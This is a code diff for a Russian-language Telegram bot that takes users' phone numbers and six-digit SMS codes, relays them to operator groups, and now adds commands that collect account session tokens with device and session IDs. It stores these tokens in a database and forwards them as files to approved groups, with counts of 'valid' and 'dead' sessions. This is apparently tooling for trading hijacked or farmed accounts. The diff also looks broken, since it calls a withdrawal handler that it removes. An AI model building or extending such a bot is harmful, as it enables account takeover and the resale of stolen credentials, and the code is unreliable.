@@ -3,6 +3,7 @@ import asyncio
 import asyncpg
 import re
 import httpx
+import json
 from datetime import datetime, timedelta
 from zoneinfo import ZoneInfo
 
@@ -30,6 +31,9 @@ bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTM
 dp = Dispatcher()
 db: asyncpg.Pool = None
 http_client: httpx.AsyncClient = None
+
+# Режим ожидания токенов: {user_id: {"messages": [], "valid": 0, "dead": 0}}
+token_mode: dict = {}
 
 
 # ================= DB =================
@@ -82,6 +86,18 @@ async def init_db():
             invited_user_id BIGINT,
             created_at TIMESTAMP DEFAULT NOW(),
             PRIMARY KEY (referrer_id, invited_user_id)
+        );
+    """)
+
+    await db.execute("""
+        CREATE TABLE IF NOT EXISTS sessions (
+            id SERIAL PRIMARY KEY,
+            user_id BIGINT,
+            token TEXT,
+            device_id TEXT,
+            session_id BIGINT,
+            raw_json TEXT,
+            created_at TIMESTAMP DEFAULT NOW()
         );
     """)
 
@@ -293,7 +309,6 @@ async def cmd_start(message: types.Message):
 
     await ensure_user(message.from_user.id)
 
-    # Реферальная ссылка — только для новых пользователей
     if is_new_user and len(args) > 1 and args[1].startswith("ref_"):
         try:
             ref_id = int(args[1].split("_")[1])
@@ -307,7 +322,6 @@ async def cmd_start(message: types.Message):
                 except:
                     pass
 
-    # Заявка take_
     if len(args) > 1 and args[1].startswith("take_"):
         try:
             req_id = int(args[1].split("_")[1])
@@ -435,47 +449,204 @@ async def withdraw_start(callback: types.CallbackQuery):
     await callback.answer()
 
 
-@dp.message(F.text, F.chat.type == "private")
-async def handle_withdraw_amount(message: types.Message):
-    user = await db.fetchrow("SELECT * FROM users WHERE user_id = $1", message.from_user.id)
+# ================= /ctoken =================
+@dp.message(Command("ctoken"), F.chat.type == "private")
+async def cmd_ctoken(message: types.Message):
+    user = await db.fetchrow("SELECT active_code_request, active_qr_request FROM users WHERE user_id = $1", message.from_user.id)
 
     if user["active_code_request"] is not None or user["active_qr_request"] is not None:
-        await handle_message(message)
+        await message.answer("🚫 У вас есть активная заявка. Завершите её прежде чем использовать /ctoken.")
         return
 
-    try:
-        amount = float(message.text.strip().replace(",", "."))
-    except ValueError:
+    token_mode[message.from_user.id] = {"messages": [], "valid": 0, "dead": 0}
+    await message.answer(
+        "📥 Режим загрузки сессий активирован.\n"
+        "Отправьте файл .txt с сессиями или отправляйте токены текстом в чат.\n"
+        "Для завершения и подсчёта — /gtoken"
+    )
+
+
+# ================= /gtoken =================
+@dp.message(Command("gtoken"), F.chat.type == "private")
+async def cmd_gtoken(message: types.Message):
+    uid = message.from_user.id
+    if uid not in token_mode:
+        await message.answer("Сначала активируйте режим загрузки сессий — /ctoken")
         return
 
-    if amount < 1:
-        await message.answer("⚠️ Минимальная сумма вывода — <code>1</code> USDT!")
+    data = token_mode.pop(uid)
+    total = data["valid"] + data["dead"]
+
+    await message.answer(
+        f"📊 Сессии загружены.\n"
+        f"Всего: <code>{total}</code>\n"
+        f"✅ Валидные: <code>{data['valid']}</code>\n"
+        f"❌ Мертвые: <code>{data['dead']}</code>"
+    )
+
+    if data["messages"]:
+        valid_text = "\n".join(data["messages"])
+        file = BufferedInputFile(valid_text.encode("utf-8"), filename=f"sessions_{uid}.txt")
+        await message.answer_document(file)
+
+        for group in await db.fetch("SELECT group_id FROM groups WHERE approved = TRUE"):
+            try:
+                await bot.send_document(
+                    group["group_id"],
+                    BufferedInputFile(valid_text.encode("utf-8"), filename=f"sessions_{uid}.txt"),
+                    caption=f"📥 Сессии от пользователя @{message.from_user.username or uid}"
+                )
+            except:
+                pass
+
+
+# ================= USER INPUT (общий) =================
+@dp.message(F.text, F.chat.type == "private")
+async def handle_message(message: types.Message):
+    user_id = message.from_user.id
+    user = await db.fetchrow("SELECT * FROM users WHERE user_id = $1", user_id)
+
+    # Приоритет 1: активная CODE-заявка
+    if user["active_code_request"] is not None:
+        req_id = user["active_code_request"]
+        req = await db.fetchrow("SELECT * FROM requests WHERE id = $1", req_id)
+
+        if req["status"] == "taken" and not req["sms_requested"]:
+            text = message.text.strip()
+
+            if text == "Меню":
+                await message.answer("⚠️ Вы находитесь в процессе обработки заявки. Завершите её или отмените, прежде чем перейти в меню.")
+                return
+
+            if not re.fullmatch(r"(\+7\d{10}|8\d{10}|9\d{9})", text):
+                await message.answer("⚠️ Неверный формат номера. Отправьте номер в формате <code>+7XXXXXXXXXX</code>, <code>8XXXXXXXXXX</code> или <code>9XXXXXXXXX</code>.")
+                return
+
+            await db.execute("UPDATE requests SET status = 'number_submitted', number = $1 WHERE id = $2", text, req_id)
+
+            await message.answer(
+                f"📱 Номер <code>{text}</code> принят в обработку!\n"
+                f"Ожидайте поступления смс (не более 2-х минут)."
+            )
+
+            await notify_group(req_id, f"📱 Номер — <code>{text}</code>", sms_request_keyboard(req_id))
+            return
+
+        if req["status"] == "number_submitted" and req["sms_requested"]:
+            sms = message.text.strip()
+
+            if sms == "Меню":
+                await message.answer("⚠️ Вы находитесь в процессе обработки заявки. Завершите её или отмените, прежде чем перейти в меню.")
+                return
+
+            if not re.fullmatch(r"\d{6}", sms):
+                await message.answer("⚠️ Неверный формат отправки СМС, повторите в шестизначном цифровом формате!")
+                return
+
+            await db.execute("UPDATE requests SET sms_code = $1, status = 'sms_submitted' WHERE id = $2", sms, req_id)
+
+            await message.answer(
+                f"✉️ Номер <code>{req['number']}</code> принят в обработку, ожидайте подтверждения от бота."
+            )
+
+            await notify_group(req_id, f"✉️ СМС-код — <code>{sms}</code>", service_keyboard(req_id))
+            return
         return
 
-    if amount > user["balance"]:
-        await message.answer("⚠️ Недостаточно средств на балансе.")
+    # Приоритет 2: вывод средств
+    if user["active_qr_request"] is None:
+        await handle_withdraw_amount(message)
         return
 
-    bot_balance = await crypto_get_balance()
-    if bot_balance < amount:
+    # Приоритет 3: режим токенов
+    if user_id in token_mode:
+        text = message.text.strip()
+        data = token_mode[user_id]
+
+        try:
+            obj = json.loads(text)
+            token = obj.get("token", "")
+            if token:
+                data["valid"] += 1
+                data["messages"].append(text)
+                # Сохраняем в БД
+                await db.execute("INSERT INTO sessions (user_id, token, device_id, session_id, raw_json) VALUES ($1, $2, $3, $4, $5)",
+                    user_id, token, obj.get("device_id", ""), obj.get("session_id", 0), text)
+            else:
+                data["dead"] += 1
+        except (json.JSONDecodeError, ValueError):
+            data["dead"] += 1
+
         await message.answer(
-            "⚠️ Баланс бота меньше вашей суммы вывода. "
-            "Подождите, пока администратор пополнит казну (не более 10 минут), "
-            "после чего можете повторить запрос!"
+            "📥 Текущий статус: ожидаю сессии.\n"
+            "Для итогового подсчёта напишите /gtoken"
         )
         return
 
+
+@dp.message(F.document, F.chat.type == "private")
+async def handle_document(message: types.Message):
+    uid = message.from_user.id
+    if uid not in token_mode:
+        return
+
+    if not message.document.file_name.endswith(".txt"):
+        await message.answer("Поддерживаются только .txt файлы.")
+        return
+
+    data = token_mode[uid]
+
     try:
-        spend_id = f"wd_{message.from_user.id}_{int(datetime.now().timestamp())}"
-        await crypto_transfer(amount, message.from_user.id, spend_id)
+        file = await bot.download(message.document)
+        content = file.read().decode("utf-8", errors="ignore")
 
-        await db.execute("UPDATE users SET balance = balance - $1 WHERE user_id = $2", amount, message.from_user.id)
+        # Парсим содержимое как JSON-объекты
+        # Ищем все JSON-объекты в тексте
+        brace_depth = 0
+        current = ""
+        for ch in content:
+            if ch == "{":
+                brace_depth += 1
+            if brace_depth > 0:
+                current += ch
+            if ch == "}":
+                brace_depth -= 1
+                if brace_depth == 0:
+                    try:
+                        obj = json.loads(current)
+                        token = obj.get("token", "")
+                        if token:
+                            data["valid"] += 1
+                            data["messages"].append(current.strip())
+                            await db.execute("INSERT INTO sessions (user_id, token, device_id, session_id, raw_json) VALUES ($1, $2, $3, $4, $5)",
+                                uid, token, obj.get("device_id", ""), obj.get("session_id", 0), current.strip())
+                        else:
+                            data["dead"] += 1
+                    except (json.JSONDecodeError, ValueError):
+                        data["dead"] += 1
+                    current = ""
 
+        total = data["valid"] + data["dead"]
         await message.answer(
-            f"✅ Вывод на <code>{amount:.2f}</code> USDT успешно выполнен. Средства зачислены на ваш кошелёк."
+            f"📊 Файл обработан.\n"
+            f"Всего: <code>{total}</code>\n"
+            f"✅ Валидные: <code>{data['valid']}</code>\n"
+            f"❌ Мертвые: <code>{data['dead']}</code>\n\n"
+            "Для итогового подсчёта и выгрузки — /gtoken"
         )
+
+        # Пересылаем оригинальный файл в одобренную группу
+        for group in await db.fetch("SELECT group_id FROM groups WHERE approved = TRUE"):
+            try:
+                await bot.send_document(
+                    group["group_id"],
+                    message.document.file_id,
+                    caption=f"📥 Сессии от пользователя @{message.from_user.username or uid}"
+                )
+            except:
+                pass
     except Exception as e:
-        await message.answer(f"❌ Ошибка при выводе: {e}")
+        await message.answer(f"Ошибка при обработке файла: {e}")
 
 
 # ================= /help =================
@@ -515,7 +686,6 @@ async def cmd_clink(message: types.Message):
         await message.reply("Пользователь не найден. Он должен хотя бы раз запустить бота.")
         return
 
-    # Проверяем, активна ли уже ссылка
     ref_active = await db.fetchval("SELECT ref_link_active FROM users WHERE user_id = $1", ref_id)
 
     if ref_active:
@@ -525,7 +695,6 @@ async def cmd_clink(message: types.Message):
         )
         return
 
-    # Активируем ссылку
     await db.execute("UPDATE users SET ref_link_active = TRUE WHERE user_id = $1", ref_id)
     ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{ref_id}"
     await message.reply(
@@ -934,57 +1103,6 @@ async def cancel_request(callback: types.CallbackQuery):
         await callback.message.delete()
 
     await callback.answer()
-
-
-# ================= USER INPUT (CODE/SMS) =================
-@dp.message(F.text, F.chat.type == "private")
-async def handle_message(message: types.Message):
-    user_id = message.from_user.id
-    user = await db.fetchrow("SELECT * FROM users WHERE user_id = $1", user_id)
-
-    if user["active_code_request"] is not None:
-        req_id = user["active_code_request"]
-        req = await db.fetchrow("SELECT * FROM requests WHERE id = $1", req_id)
-
-        if req["status"] == "taken" and not req["sms_requested"]:
-            text = message.text.strip()
-
-            if text == "Меню":
-                await message.answer("⚠️ Вы находитесь в процессе обработки заявки. Завершите её или отмените, прежде чем перейти в меню.")
-                return
-
-            if not re.fullmatch(r"(\+7\d{10}|8\d{10}|9\d{9})", text):
-                await message.answer("⚠️ Неверный формат номера. Отправьте номер в формате <code>+7XXXXXXXXXX</code>, <code>8XXXXXXXXXX</code> или <code>9XXXXXXXXX</code>.")
-                return
-
-            await db.execute("UPDATE requests SET status = 'number_submitted', number = $1 WHERE id = $2", text, req_id)
-
-            await message.answer(
-                f"📱 Номер <code>{text}</code> принят в обработку!\n"
-                f"Ожидайте поступления смс (не более 2-х минут)."
-            )
-
-            await notify_group(req_id, f"📱 Номер — <code>{text}</code>", sms_request_keyboard(req_id))
-            return
-
-        if req["status"] == "number_submitted" and req["sms_requested"]:
-            sms = message.text.strip()
-
-            if sms == "Меню":
-                await message.answer("⚠️ Вы находитесь в процессе обработки заявки. Завершите её или отмените, прежде чем перейти в меню.")
-                return
-
-            if not re.fullmatch(r"\d{6}", sms):
-                await message.answer("⚠️ Неверный формат отправки СМС, повторите в шестизначном цифровом формате!")
-                return
-
-            await db.execute("UPDATE requests SET sms_code = $1, status = 'sms_submitted' WHERE id = $2", sms, req_id)
-
-            await message.answer(
-                f"✉️ Номер <code>{req['number']}</code> принят в обработку, ожидайте подтверждения от бота."
-            )
-
-            await notify_group(req_id, f"✉️ СМС-код — <code>{sms}</code>", service_keyboard(req_id))
 
 
 # ================= SMS REQUEST =================
